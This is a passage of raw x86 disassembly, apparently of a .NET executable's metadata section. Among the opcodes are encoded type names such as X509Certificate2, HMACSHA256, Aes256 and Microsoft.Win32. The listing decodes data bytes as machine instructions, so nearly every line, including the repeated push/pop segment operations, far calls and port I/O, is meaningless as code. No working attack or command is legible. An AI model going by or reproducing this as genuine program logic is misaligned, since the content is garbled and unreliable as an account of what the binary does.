  40536b:	03 3c 06             	add    (%esi,%eax,1),%edi
  40536e:	d4 02                	aam    $0x2
  405370:	79 01                	jns    0x405373
  405372:	4e                   	dec    %esi
  405373:	06                   	push   %es
  405374:	d4 02                	aam    $0x2
  405376:	79 01                	jns    0x405379
  405378:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405379:	0a 06                	or     (%esi),%al
  40537b:	01 b1 03 8b 16 da    	add    %esi,-0x25e974fd(%ecx)
  405381:	02 b9 03 e5 11 e0    	add    -0x1fee1afd(%ecx),%bh
  405387:	02 b9 03 18 05 e7    	add    -0x18fae7fd(%ecx),%bh
  40538d:	02 a9 02 c6 06 06    	add    0x606c602(%ecx),%ch
  405393:	00 b1 00 c6 06 06    	add    %dh,0x606c600(%ecx)
  405399:	00 49 01             	add    %cl,0x1(%ecx)
  40539c:	e5 11                	in     $0x11,%eax
  40539e:	c1 00 0c             	roll   $0xc,(%eax)
  4053a1:	00 e5                	add    %ah,%ch
  4053a3:	11 06                	adc    %eax,(%esi)
  4053a5:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053a8:	5d                   	pop    %ebp
  4053a9:	02 09                	add    (%ecx),%cl
  4053ab:	03 0c 00             	add    (%eax,%eax,1),%ecx
  4053ae:	d6                   	salc
  4053af:	16                   	push   %ss
  4053b0:	82 02 0c             	addb   $0xc,(%edx)
  4053b3:	00 c8                	add    %cl,%al
  4053b5:	17                   	pop    %ss
  4053b6:	0f 03 59 02          	lsl    0x2(%ecx),%ebx
  4053ba:	5b                   	pop    %ebx
  4053bb:	0e                   	push   %cs
  4053bc:	15 03 89 01 4d       	adc    $0x4d018903,%eax
  4053c1:	14 2f                	adc    $0x2f,%al
  4053c3:	03 89 01 5d 01 36    	add    0x36015d01(%ecx),%ecx
  4053c9:	03 91 01 a6 02 36    	add    0x3602a601(%ecx),%edx
  4053cf:	03 c9                	add    %ecx,%ecx
  4053d1:	03 95 18 3c 03 71    	add    0x71033c18(%ebp),%edx
  4053d7:	01 e5                	add    %esp,%ebp
  4053d9:	11 01                	adc    %eax,(%ecx)
  4053db:	00 99 01 e5 11 52    	add    %bl,0x5211e501(%ecx)
  4053e1:	03 d1                	add    %ecx,%edx
  4053e3:	03 c6                	add    %esi,%eax
  4053e5:	06                   	push   %es
  4053e6:	06                   	push   %es
  4053e7:	00 d9                	add    %bl,%cl
  4053e9:	03 e5                	add    %ebp,%esp
  4053eb:	11 ef                	adc    %ebp,%edi
  4053ed:	00 e1                	add    %ah,%cl
  4053ef:	03 10                	add    (%eax),%edx
  4053f1:	0a 5a 03             	or     0x3(%edx),%bl
  4053f4:	29 01                	sub    %eax,(%ecx)
  4053f6:	2e 04 c3             	cs add $0xc3,%al
  4053f9:	01 39                	add    %edi,(%ecx)
  4053fb:	01 e0                	add    %esp,%eax
  4053fd:	17                   	pop    %ss
  4053fe:	1f                   	pop    %ds
  4053ff:	02 39                	add    (%ecx),%bh
  405401:	01 1c 09             	add    %ebx,(%ecx,%ecx,1)
  405404:	6a 03                	push   $0x3
  405406:	39 01                	cmp    %eax,(%ecx)
  405408:	e0 17                	loopne 0x405421
  40540a:	7e 03                	jle    0x40540f
  40540c:	39 01                	cmp    %eax,(%ecx)
  40540e:	13 09                	adc    (%ecx),%ecx
  405410:	73 02                	jae    0x405414
  405412:	39 01                	cmp    %eax,(%ecx)
  405414:	07                   	pop    %es
  405415:	09 10                	or     %edx,(%eax)
  405417:	00 39                	add    %bh,(%ecx)
  405419:	01 fa                	add    %edi,%edx
  40541b:	17                   	pop    %ss
  40541c:	88 03                	mov    %al,(%ebx)
  40541e:	39 01                	cmp    %eax,(%ecx)
  405420:	64 04 10             	fs add $0x10,%al
  405423:	00 11                	add    %dl,(%ecx)
  405425:	01 42 13             	add    %eax,0x13(%edx)
  405428:	9a 01 11 01 af 0a 06 	lcall  $0x60a,$0xaf011101
  40542f:	01 11                	add    %edx,(%ecx)
  405431:	01 c9                	add    %ecx,%ecx
  405433:	0a 10                	or     (%eax),%dl
  405435:	00 11                	add    %dl,(%ecx)
  405437:	01 ea                	add    %ebp,%edx
  405439:	10 a0 01 1c 00 5d    	adc    %ah,0x5d001c01(%eax)
  40543f:	02 09                	add    (%ecx),%cl
  405441:	03 11                	add    (%ecx),%edx
  405443:	01 52 13             	add    %edx,0x13(%edx)
  405446:	be 01 f1 03 3f       	mov    $0x3f03f101,%esi
  40544b:	17                   	pop    %ss
  40544c:	b8 03 1c 00 cd       	mov    $0xcd001c03,%eax
  405451:	11 d0                	adc    %edx,%eax
  405453:	03 24 00             	add    (%eax,%eax,1),%esp
  405456:	7f 16                	jg     0x40546e
  405458:	e3 03                	jecxz  0x40545d
  40545a:	1c 00                	sbb    $0x0,%al
  40545c:	47                   	inc    %edi
  40545d:	09 e8                	or     %ebp,%eax
  40545f:	03 24 00             	add    (%eax,%eax,1),%esp
  405462:	4c                   	dec    %esp
  405463:	17                   	pop    %ss
  405464:	b7 00                	mov    $0x0,%bh
  405466:	01 04 38             	add    %eax,(%eax,%edi,1)
  405469:	0e                   	push   %cs
  40546a:	f8                   	clc
  40546b:	03 09                	add    (%ecx),%ecx
  40546d:	04 b2                	add    $0xb2,%al
  40546f:	14 fe                	adc    $0xfe,%al
  405471:	03 01                	add    (%ecx),%eax
  405473:	04 58                	add    $0x58,%al
  405475:	02 05 04 b9 01 97    	add    0x9701b904,%al
  40547b:	06                   	push   %es
  40547c:	0d 04 11 04 01       	or     $0x1041104,%eax
  405481:	04 14                	add    $0x14,%al
  405483:	04 c1                	add    $0xc1,%al
  405485:	01 ef                	add    %ebp,%edi
  405487:	04 1b                	add    $0x1b,%al
  405489:	04 21                	add    $0x21,%al
  40548b:	04 15                	add    $0x15,%al
  40548d:	07                   	pop    %es
  40548e:	24 04                	and    $0x4,%al
  405490:	31 04 17             	xor    %eax,(%edi,%edx,1)
  405493:	10 2e                	adc    %ch,(%esi)
  405495:	04 2c                	add    $0x2c,%al
  405497:	00 15 07 67 04 2c    	add    %dl,0x2c046707
  40549d:	00 74 15 74          	add    %dh,0x74(%ebp,%edx,1)
  4054a1:	04 34                	add    $0x34,%al
  4054a3:	00 91 04 8f 04 1c    	add    %dl,0x1c048f04(%ecx)
  4054a9:	00 e5                	add    %ah,%ch
  4054ab:	11 06                	adc    %eax,(%esi)
  4054ad:	00 59 02             	add    %bl,0x2(%ecx)
  4054b0:	d3 18                	rcrl   %cl,(%eax)
  4054b2:	36 00 49 04          	add    %cl,%ss:0x4(%ecx)
  4054b6:	e5 11                	in     $0x11,%eax
  4054b8:	10 00                	adc    %al,(%eax)
  4054ba:	e1 01                	loope  0x4054bd
  4054bc:	e5 11                	in     $0x11,%eax
  4054be:	b4 04                	mov    $0x4,%ah
  4054c0:	51                   	push   %ecx
  4054c1:	04 5d                	add    $0x5d,%al
  4054c3:	13 bc 04 11 02 88 0a 	adc    0xa880211(%esp,%eax,1),%edi
  4054ca:	c2 04 59             	ret    $0x5904
  4054cd:	04 e5                	add    $0xe5,%al
  4054cf:	11 10                	adc    %edx,(%eax)
  4054d1:	00 09                	add    %cl,(%ecx)
  4054d3:	01 e5                	add    %esp,%ebp
  4054d5:	11 06                	adc    %eax,(%esi)
  4054d7:	00 e9                	add    %ch,%cl
  4054d9:	01 e5                	add    %esp,%ebp
  4054db:	11 06                	adc    %eax,(%esi)
  4054dd:	00 61 04             	add    %ah,0x4(%ecx)
  4054e0:	be 09 01 00 61       	mov    $0x61000109,%esi
  4054e5:	04 5b                	add    $0x5b,%al
  4054e7:	09 01                	or     %eax,(%ecx)
  4054e9:	00 61 04             	add    %ah,0x4(%ecx)
  4054ec:	10 04 dc             	adc    %al,(%esp,%ebx,8)
  4054ef:	04 61                	add    $0x61,%al
  4054f1:	04 04                	add    $0x4,%al
  4054f3:	0a e3                	or     %bl,%ah
  4054f5:	04 61                	add    $0x61,%al
  4054f7:	04 d8                	add    $0xd8,%al
  4054f9:	17                   	pop    %ss
  4054fa:	9a 01 61 04 bd 01 06 	lcall  $0x601,$0xbd046101
  405501:	00 61 04             	add    %ah,0x4(%ecx)
  405504:	0a 12                	or     (%edx),%dl
  405506:	ea 04 f1 01 e5 11 f0 	ljmp   $0xf011,$0xe501f104
  40550d:	04 61                	add    $0x61,%al
  40550f:	04 af                	add    $0xaf,%al
  405511:	01 be 01 f1 01 4f    	add    %edi,0x4f01f101(%esi)
  405517:	0c 06                	or     $0x6,%al
  405519:	00 f9                	add    %bh,%cl
  40551b:	01 e5                	add    %esp,%ebp
  40551d:	11 9a 01 09 01 c8    	adc    %ebx,-0x37fef6ff(%edx)
  405523:	17                   	pop    %ss
  405524:	be 01 99 03 34       	mov    $0x34039901,%esi
  405529:	0b fd                	or     %ebp,%edi
  40552b:	04 31                	add    $0x31,%al
  40552d:	02 d5                	add    %ch,%dl
  40552f:	0a 06                	or     (%esi),%al
  405531:	05 89 04 e5 11       	add    $0x11e50489,%eax
  405536:	10 00                	adc    %al,(%eax)
  405538:	61                   	popa
  405539:	04 b6                	add    $0xb6,%al
  40553b:	01 9a 01 61 04 fa    	add    %ebx,-0x5fb9eff(%edx)
  405541:	11 ea                	adc    %ebp,%edx
  405543:	04 a9                	add    $0xa9,%al
  405545:	02 93 0b 41 02 91    	add    -0x6efdbef5(%ebx),%dl
  40554b:	04 6b                	add    $0x6b,%al
  40554d:	18 29                	sbb    %ch,(%ecx)
  40554f:	05 a1 04 b8 17       	add    $0x17b804a1,%eax
  405554:	3e 05 01 02 e5 11    	ds add $0x11e50201,%eax
  40555a:	06                   	push   %es
  40555b:	00 08                	add    %cl,(%eax)
  40555d:	00 88 00 72 05 08    	add    %cl,0x8057200(%eax)
  405563:	00 8c 00 77 05 08 00 	add    %cl,0x80577(%eax,%eax,1)
  40556a:	90                   	nop
  40556b:	00 7c 05 08          	add    %bh,0x8(%ebp,%eax,1)
  40556f:	00 94 00 72 05 09 00 	add    %dl,0x90572(%eax,%eax,1)
  405576:	ac                   	lods   %ds:(%esi),%al
  405577:	00 81 05 09 00 b0    	add    %al,-0x4ffff6fb(%ecx)
  40557d:	00 86 05 09 00 b4    	add    %al,-0x4bfff6fb(%esi)
  405583:	00 8b 05 2e 00 0b    	add    %cl,0xb002e05(%ebx)
  405589:	00 ac 06 2e 00 13 00 	add    %ch,0x13002e(%esi,%eax,1)
  405590:	b5 06                	mov    $0x6,%ch
  405592:	2e 00 1b             	add    %bl,%cs:(%ebx)
  405595:	00 d4                	add    %dl,%ah
  405597:	06                   	push   %es
  405598:	2e 00 23             	add    %ah,%cs:(%ebx)
  40559b:	00 dd                	add    %bl,%ch
  40559d:	06                   	push   %es
  40559e:	2e 00 2b             	add    %ch,%cs:(%ebx)
  4055a1:	00 dd                	add    %bl,%ch
  4055a3:	06                   	push   %es
  4055a4:	2e 00 33             	add    %dh,%cs:(%ebx)
  4055a7:	00 dd                	add    %bl,%ch
  4055a9:	06                   	push   %es
  4055aa:	2e 00 3b             	add    %bh,%cs:(%ebx)
  4055ad:	00 dd                	add    %bl,%ch
  4055af:	06                   	push   %es
  4055b0:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  4055b4:	dd 06                	fldl   (%esi)
  4055b6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  4055ba:	dd 06                	fldl   (%esi)
  4055bc:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4055c0:	dd 06                	fldl   (%esi)
  4055c2:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  4055c6:	dd 06                	fldl   (%esi)
  4055c8:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4055cc:	e3 06                	jecxz  0x4055d4
  4055ce:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4055d2:	f0 06                	lock push %es
  4055d4:	c0 00 73             	rolb   $0x73,(%eax)
  4055d7:	00 8b 05 e0 00 73    	add    %cl,0x7300e005(%ebx)
  4055dd:	00 8b 05 00 01 73    	add    %cl,0x73010005(%ebx)
  4055e3:	00 8b 05 20 01 73    	add    %cl,0x73012005(%ebx)
  4055e9:	00 8b 05 40 01 73    	add    %cl,0x73014005(%ebx)
  4055ef:	00 8b 05 60 01 73    	add    %cl,0x73016005(%ebx)
  4055f5:	00 8b 05 80 01 73    	add    %cl,0x73018005(%ebx)
  4055fb:	00 8b 05 a0 01 73    	add    %cl,0x7301a005(%ebx)
  405601:	00 8b 05 c0 01 73    	add    %cl,0x7301c005(%ebx)
  405607:	00 8b 05 e0 01 73    	add    %cl,0x7301e005(%ebx)
  40560d:	00 8b 05 00 02 73    	add    %cl,0x73020005(%ebx)
  405613:	00 8b 05 20 02 73    	add    %cl,0x73022005(%ebx)
  405619:	00 8b 05 23 02 73    	add    %cl,0x73022305(%ebx)
  40561f:	00 8b 05 40 02 73    	add    %cl,0x73024005(%ebx)
  405625:	00 8b 05 60 02 73    	add    %cl,0x73026005(%ebx)
  40562b:	00 8b 05 61 02 73    	add    %cl,0x73026105(%ebx)
  405631:	00 8b 05 61 02 7b    	add    %cl,0x7b026105(%ebx)
  405637:	00 3a                	add    %bh,(%edx)
  405639:	07                   	pop    %es
  40563a:	63 02                	arpl   %eax,(%edx)
  40563c:	73 00                	jae    0x40563e
  40563e:	8b 05 80 02 73 00    	mov    0x730280,%eax
  405644:	8b 05 81 02 73 00    	mov    0x730281,%eax
  40564a:	8b 05 81 02 7b 00    	mov    0x7b0281,%eax
  405650:	3a 07                	cmp    (%edi),%al
  405652:	a0 02 73 00 8b       	mov    0x8b007302,%al
  405657:	05 a1 02 73 00       	add    $0x7302a1,%eax
  40565c:	8b 05 a1 02 7b 00    	mov    0x7b02a1,%eax
  405662:	3a 07                	cmp    (%edi),%al
  405664:	c0 02 73             	rolb   $0x73,(%edx)
  405667:	00 8b 05 c1 02 73    	add    %cl,0x7302c105(%ebx)
  40566d:	00 8b 05 c1 02 7b    	add    %cl,0x7b02c105(%ebx)
  405673:	00 3a                	add    %bh,(%edx)
  405675:	07                   	pop    %es
  405676:	e0 02                	loopne 0x40567a
  405678:	73 00                	jae    0x40567a
  40567a:	8b 05 e1 02 73 00    	mov    0x7302e1,%eax
  405680:	8b 05 e1 02 7b 00    	mov    0x7b02e1,%eax
  405686:	3a 07                	cmp    (%edi),%al
  405688:	00 03                	add    %al,(%ebx)
  40568a:	73 00                	jae    0x40568c
  40568c:	8b 05 01 03 73 00    	mov    0x730301,%eax
  405692:	8b 05 01 03 7b 00    	mov    0x7b0301,%eax
  405698:	3a 07                	cmp    (%edi),%al
  40569a:	20 03                	and    %al,(%ebx)
  40569c:	73 00                	jae    0x40569e
  40569e:	8b 05 21 03 73 00    	mov    0x730321,%eax
  4056a4:	8b 05 21 03 7b 00    	mov    0x7b0321,%eax
  4056aa:	3a 07                	cmp    (%edi),%al
  4056ac:	40                   	inc    %eax
  4056ad:	03 73 00             	add    0x0(%ebx),%esi
  4056b0:	8b 05 41 03 73 00    	mov    0x730341,%eax
  4056b6:	8b 05 41 03 7b 00    	mov    0x7b0341,%eax
  4056bc:	3a 07                	cmp    (%edi),%al
  4056be:	61                   	popa
  4056bf:	03 73 00             	add    0x0(%ebx),%esi
  4056c2:	8b 05 61 03 7b 00    	mov    0x7b0361,%eax
  4056c8:	3a 07                	cmp    (%edi),%al
  4056ca:	81 03 73 00 8b 05    	addl   $0x58b0073,(%ebx)
  4056d0:	81 03 7b 00 3a 07    	addl   $0x73a007b,(%ebx)
  4056d6:	a1 03 73 00 8b       	mov    0x8b007303,%eax
  4056db:	05 a1 03 7b 00       	add    $0x7b03a1,%eax
  4056e0:	3a 07                	cmp    (%edi),%al
  4056e2:	01 00                	add    %eax,(%eax)
  4056e4:	20 00                	and    %al,(%eax)
  4056e6:	00 00                	add    %al,(%eax)
  4056e8:	14 00                	adc    $0x0,%al
  4056ea:	20 00                	and    %al,(%eax)
  4056ec:	3b 00                	cmp    (%eax),%eax
  4056ee:	3f                   	aas
  4056ef:	00 71 00             	add    %dh,0x0(%ecx)
  4056f2:	34 01                	xor    $0x1,%al
  4056f4:	6d                   	insl   (%dx),%es:(%edi)
  4056f5:	01 aa 01 c7 01 3b    	add    %ebp,0x3b01c701(%edx)
  4056fb:	02 45 02             	add    0x2(%ebp),%al
  4056fe:	4f                   	dec    %edi
  4056ff:	02 7c 02 86          	add    -0x7a(%edx,%eax,1),%bh
  405703:	02 9a 02 be 02 ee    	add    -0x11fd41fe(%edx),%bl
  405709:	02 1c 03             	add    (%ebx,%eax,1),%bl
  40570c:	46                   	inc    %esi
  40570d:	03 4f 03             	add    0x3(%edi),%ecx
  405710:	61                   	popa
  405711:	03 73 03             	add    0x3(%ebx),%esi
  405714:	90                   	nop
  405715:	03 ee                	add    %esi,%ebp
  405717:	03 a7 04 ad 04 c8    	add    -0x37fb52fc(%edi),%esp
  40571d:	04 0c                	add    $0xc,%al
  40571f:	05 36 05 48 05       	add    $0x5480536,%eax
  405724:	58                   	pop    %eax
  405725:	05 04 00 01 00       	add    $0x10004,%eax
  40572a:	00 00                	add    %al,(%eax)
  40572c:	42                   	inc    %edx
  40572d:	16                   	push   %ss
  40572e:	88 06                	mov    %al,(%esi)
  405730:	00 00                	add    %al,(%eax)
  405732:	26 16                	es push %ss
  405734:	8d 06                	lea    (%esi),%eax
  405736:	00 00                	add    %al,(%eax)
  405738:	e3 10                	jecxz  0x40574a
  40573a:	92                   	xchg   %eax,%edx
  40573b:	06                   	push   %es
  40573c:	00 00                	add    %al,(%eax)
  40573e:	8a 09                	mov    (%ecx),%cl
  405740:	97                   	xchg   %eax,%edi
  405741:	06                   	push   %es
  405742:	00 00                	add    %al,(%eax)
  405744:	bc 15 97 06 00       	mov    $0x69715,%esp
  405749:	00 3d 09 9b 06 00    	add    %bh,0x69b09
  40574f:	00 91 02 a0 06 00    	add    %dl,0x6a002(%ecx)
  405755:	00 36                	add    %dh,(%esi)
  405757:	02 a4 06 00 00 ee 09 	add    0x9ee0000(%esi,%eax,1),%ah
  40575e:	9b                   	fwait
  40575f:	06                   	push   %es
  405760:	00 00                	add    %al,(%eax)
  405762:	ea 0c a8 06 00 00 0d 	ljmp   $0xd00,$0x6a80c
  405769:	0b a0 06 02 00 06    	or     0x6000206(%eax),%esp
  40576f:	00 03                	add    %al,(%ebx)
  405771:	00 01                	add    %al,(%ecx)
  405773:	00 07                	add    %al,(%edi)
  405775:	00 03                	add    %al,(%ebx)
  405777:	00 02                	add    %al,(%edx)
  405779:	00 08                	add    %cl,(%eax)
  40577b:	00 05 00 01 00 09    	add    %al,0x9000100
  405781:	00 05 00 02 00 0a    	add    %al,0xa000200
  405787:	00 07                	add    %al,(%edi)
  405789:	00 01                	add    %al,(%ecx)
  40578b:	00 0b                	add    %cl,(%ebx)
  40578d:	00 07                	add    %al,(%edi)
  40578f:	00 02                	add    %al,(%edx)
  405791:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405794:	09 00                	or     %eax,(%eax)
  405796:	01 00                	add    %eax,(%eax)
  405798:	0d 00 09 00 02       	or     $0x2000900,%eax
  40579d:	00 0e                	add    %cl,(%esi)
  40579f:	00 0b                	add    %cl,(%ebx)
  4057a1:	00 01                	add    %al,(%ecx)
  4057a3:	00 0f                	add    %cl,(%edi)
  4057a5:	00 0b                	add    %cl,(%ebx)
  4057a7:	00 02                	add    %al,(%edx)
  4057a9:	00 10                	add    %dl,(%eax)
  4057ab:	00 0d 00 01 00 11    	add    %cl,0x11000100
  4057b1:	00 0d 00 02 00 12    	add    %cl,0x12000200
  4057b7:	00 0f                	add    %cl,(%edi)
  4057b9:	00 01                	add    %al,(%ecx)
  4057bb:	00 13                	add    %dl,(%ebx)
  4057bd:	00 0f                	add    %cl,(%edi)
  4057bf:	00 02                	add    %al,(%edx)
  4057c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4057c4:	11 00                	adc    %eax,(%eax)
  4057c6:	02 00                	add    (%eax),%al
  4057c8:	15 00 13 00 01       	adc    $0x1001300,%eax
  4057cd:	00 16                	add    %dl,(%esi)
  4057cf:	00 13                	add    %dl,(%ebx)
  4057d1:	00 02                	add    %al,(%edx)
  4057d3:	00 17                	add    %dl,(%edi)
  4057d5:	00 15 00 01 00 18    	add    %dl,0x18000100
  4057db:	00 15 00 02 00 19    	add    %dl,0x19000200
  4057e1:	00 17                	add    %dl,(%edi)
  4057e3:	00 01                	add    %al,(%ecx)
  4057e5:	00 1a                	add    %bl,(%edx)
  4057e7:	00 17                	add    %dl,(%edi)
  4057e9:	00 0f                	add    %cl,(%edi)
  4057eb:	0d 02 0d 1a 0d       	or     $0xd1a0d02,%eax
  4057f0:	02 03                	add    (%ebx),%al
  4057f2:	85 03                	test   %eax,(%ebx)
  4057f4:	af                   	scas   %es:(%edi),%eax
  4057f5:	03 da                	add    %edx,%ebx
  4057f7:	03 4b 04             	add    0x4(%ebx),%ecx
  4057fa:	78 04                	js     0x405800
  4057fc:	00 01                	add    %al,(%ecx)
  4057fe:	73 00                	jae    0x405800
  405800:	74 17                	je     0x405819
  405802:	01 00                	add    %eax,(%eax)
  405804:	00 01                	add    %al,(%ecx)
  405806:	75 00                	jne    0x405808
  405808:	61                   	popa
  405809:	17                   	pop    %ss
  40580a:	01 00                	add    %eax,(%eax)
  40580c:	00 01                	add    %al,(%ecx)
  40580e:	77 00                	ja     0x405810
  405810:	cd 04                	int    $0x4
  405812:	02 00                	add    (%eax),%al
  405814:	41                   	inc    %ecx
  405815:	01 79 00             	add    %edi,0x0(%ecx)
  405818:	96                   	xchg   %eax,%esi
  405819:	16                   	push   %ss
  40581a:	02 00                	add    (%eax),%al
  40581c:	40                   	inc    %eax
  40581d:	01 7b 00             	add    %edi,0x0(%ebx)
  405820:	33 07                	xor    (%edi),%eax
  405822:	02 00                	add    (%eax),%al
  405824:	40                   	inc    %eax
  405825:	01 7d 00             	add    %edi,0x0(%ebp)
  405828:	6b 0c 03 00          	imul   $0x0,(%ebx,%eax,1),%ecx
  40582c:	20 82 00 00 29 00    	and    %al,0x290000(%edx)
  405832:	04 80                	add    $0x80,%al
  405834:	00 00                	add    %al,(%eax)
  405836:	01 00                	add    %eax,(%eax)
	...
  405844:	8e 01                	mov    (%ecx),%es
  405846:	00 00                	add    %al,(%eax)
  405848:	04 00                	add    $0x0,%al
	...
  405852:	00 00                	add    %al,(%eax)
  405854:	60                   	pusha
  405855:	05 f8 01 00 00       	add    $0x1f8,%eax
  40585a:	00 00                	add    %al,(%eax)
  40585c:	04 00                	add    $0x0,%al
	...
  405866:	00 00                	add    %al,(%eax)
  405868:	60                   	pusha
  405869:	05 9d 0d 00 00       	add    $0xd9d,%eax
  40586e:	00 00                	add    %al,(%eax)
  405870:	01 00                	add    %eax,(%eax)
	...
  40587e:	e9 01 00 00 00       	jmp    0x405884
  405883:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40588e:	00 00                	add    %al,(%eax)
  405890:	69 05 61 16 00 00 00 	imul   $0x40000,0x1661,%eax
  405897:	00 04 00 
	...
  4058a2:	00 00                	add    %al,(%eax)
  4058a4:	69 05 e9 0a 00 00 00 	imul   $0x40000,0xae9,%eax
  4058ab:	00 04 00 
	...
  4058b6:	00 00                	add    %al,(%eax)
  4058b8:	60                   	pusha
  4058b9:	05 aa 06 00 00       	add    $0x6aa,%eax
  4058be:	00 00                	add    %al,(%eax)
  4058c0:	0a 00                	or     (%eax),%al
	...
  4058ca:	00 00                	add    %al,(%eax)
  4058cc:	69 05 1c 02 00 00 00 	imul   $0x40000,0x21c,%eax
  4058d3:	00 04 00 
	...
  4058de:	00 00                	add    %al,(%eax)
  4058e0:	60                   	pusha
  4058e1:	05 18 14 00 00       	add    $0x1418,%eax
  4058e6:	00 00                	add    %al,(%eax)
  4058e8:	04 00                	add    $0x0,%al
	...
  4058f2:	00 00                	add    %al,(%eax)
  4058f4:	69 05 e1 0f 00 00 00 	imul   $0x120000,0xfe1,%eax
  4058fb:	00 12 00 
  4058fe:	0b 00                	or     (%eax),%eax
  405900:	13 00                	adc    (%eax),%eax
  405902:	0e                   	push   %cs
  405903:	00 14 00             	add    %dl,(%eax,%eax,1)
  405906:	11 00                	adc    %eax,(%eax)
  405908:	7f 01                	jg     0x40590b
  40590a:	ca 03 00             	lret   $0x3
  40590d:	00 00                	add    %al,(%eax)
  40590f:	00 00                	add    %al,(%eax)
  405911:	41                   	inc    %ecx
  405912:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  405916:	6e                   	outsb  %ds:(%esi),(%dx)
  405917:	60                   	pusha
  405918:	31 30                	xor    %esi,(%eax)
  40591a:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40591d:	70 5f                	jo     0x40597e
  40591f:	5f                   	pop    %edi
  405920:	30 00                	xor    %al,(%eax)
  405922:	49                   	dec    %ecx
  405923:	45                   	inc    %ebp
  405924:	6e                   	outsb  %ds:(%esi),(%dx)
  405925:	75 6d                	jne    0x405994
  405927:	65 72 61             	gs jb  0x40598b
  40592a:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40592e:	31 00                	xor    %eax,(%eax)
  405930:	43                   	inc    %ebx
  405931:	61                   	popa
  405932:	6c                   	insb   (%dx),%es:(%edi)
  405933:	6c                   	insb   (%dx),%es:(%edi)
  405934:	53                   	push   %ebx
  405935:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  40593c:	69 
  40593d:	73 74                	jae    0x4059b3
  40593f:	60                   	pusha
  405940:	31 00                	xor    %eax,(%eax)
  405942:	61                   	popa
  405943:	31 00                	xor    %eax,(%eax)
  405945:	76 31                	jbe    0x405978
  405947:	00 5f 5f             	add    %bl,0x5f(%edi)
  40594a:	53                   	push   %ebx
  40594b:	74 61                	je     0x4059ae
  40594d:	74 69                	je     0x4059b8
  40594f:	63 41 72             	arpl   %eax,0x72(%ecx)
  405952:	72 61                	jb     0x4059b5
  405954:	79 49                	jns    0x40599f
  405956:	6e                   	outsb  %ds:(%esi),(%dx)
  405957:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40595e:	69 
  40595f:	7a 65                	jp     0x4059c6
  405961:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  405966:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40596d:	74 2e                	je     0x40599d
  40596f:	57                   	push   %edi
  405970:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  405977:	49                   	dec    %ecx
  405978:	6e                   	outsb  %ds:(%esi),(%dx)
  405979:	74 33                	je     0x4059ae
  40597b:	32 00                	xor    (%eax),%al
  40597d:	3c 3e                	cmp    $0x3e,%al
  40597f:	6f                   	outsl  %ds:(%esi),(%dx)
  405980:	5f                   	pop    %edi
  405981:	5f                   	pop    %edi
  405982:	32 00                	xor    (%eax),%al
  405984:	61                   	popa
  405985:	32 00                	xor    (%eax),%al
  405987:	58                   	pop    %eax
  405988:	35 30 39 43 65       	xor    $0x65433930,%eax
  40598d:	72 74                	jb     0x405a03
  40598f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405996:	32 00                	xor    (%eax),%al
  405998:	76 32                	jbe    0x4059cc
  40599a:	00 76 33             	add    %dh,0x33(%esi)
  40599d:	00 49 6e             	add    %cl,0x6e(%ecx)
  4059a0:	74 36                	je     0x4059d8
  4059a2:	34 00                	xor    $0x0,%al
  4059a4:	48                   	dec    %eax
  4059a5:	4d                   	dec    %ebp
  4059a6:	41                   	inc    %ecx
  4059a7:	43                   	inc    %ebx
  4059a8:	53                   	push   %ebx
  4059a9:	48                   	dec    %eax
  4059aa:	41                   	inc    %ecx
  4059ab:	32 35 36 00 53 68    	xor    0x68530036,%dh
  4059b1:	61                   	popa
  4059b2:	32 35 36 00 41 65    	xor    0x65410036,%dh
  4059b8:	73 32                	jae    0x4059ec
  4059ba:	35 36 00 61 65       	xor    $0x65610036,%eax
  4059bf:	73 32                	jae    0x4059f3
  4059c1:	35 36 00 67 65       	xor    $0x65670036,%eax
  4059c6:	74 5f                	je     0x405a27
  4059c8:	55                   	push   %ebp
  4059c9:	54                   	push   %esp
  4059ca:	46                   	inc    %esi
  4059cb:	38 00                	cmp    %al,(%eax)
  4059cd:	3c 4d                	cmp    $0x4d,%al
  4059cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d0:	64 75 6c             	fs jne 0x405a3f
  4059d3:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  4059d8:	72 69                	jb     0x405a43
  4059da:	76 61                	jbe    0x405a3d
  4059dc:	74 65                	je     0x405a43
  4059de:	49                   	dec    %ecx
  4059df:	6d                   	insl   (%dx),%es:(%edi)
  4059e0:	70 6c                	jo     0x405a4e
  4059e2:	65 6d                	gs insl (%dx),%es:(%edi)
  4059e4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4059e6:	74 61                	je     0x405a49
  4059e8:	74 69                	je     0x405a53
  4059ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4059eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4059ec:	44                   	inc    %esp
  4059ed:	65 74 61             	gs je  0x405a51
  4059f0:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  4059f7:	42 
  4059f8:	32 41 31             	xor    0x31(%ecx),%al
  4059fb:	46                   	inc    %esi
  4059fc:	39 39                	cmp    %edi,(%ecx)
  4059fe:	30 32                	xor    %dh,(%edx)
  405a00:	42                   	inc    %edx
  405a01:	33 35 46 38 46 38    	xor    0x38463846,%esi
  405a07:	38 30                	cmp    %dh,(%eax)
  405a09:	45                   	inc    %ebp
  405a0a:	46                   	inc    %esi
